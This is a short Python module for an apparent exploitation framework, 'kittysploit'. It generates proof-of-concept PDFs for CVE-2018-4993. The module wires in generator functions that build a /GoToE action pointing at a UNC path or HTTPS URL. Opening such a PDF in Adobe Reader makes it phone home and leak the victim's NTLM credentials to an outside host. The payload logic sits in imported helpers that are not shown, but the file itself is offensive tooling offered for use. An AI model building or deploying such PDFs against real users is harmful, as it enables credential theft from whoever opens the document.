#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.actions import write_gotoe_unc, write_gotoe_https


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2018-4993 GoToE NTLM Callback',
        "description": 'Generate PDF PoCs for CVE-2018-4993: /GoToE action with UNC path (NTLM) and HTTPS URL variant. Phone-home validation for Adobe Reader.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2018-4993'],
        "references": ['https://github.com/deepzec/Bad-Pdf'],
        "tags": ['pdf', 'cve-2018-4993', 'gotoe', 'ntlm', 'unc', 'acrobat'],
    }

    PDF_GENERATORS = (
        write_gotoe_unc,
        write_gotoe_https,
    )

    CVE_IDS = ['CVE-2018-4993']
    MODULE_TITLE = 'PDF CVE-2018-4993 GoToE NTLM Callback'

    def run(self):
        return self.run_pdf_cve()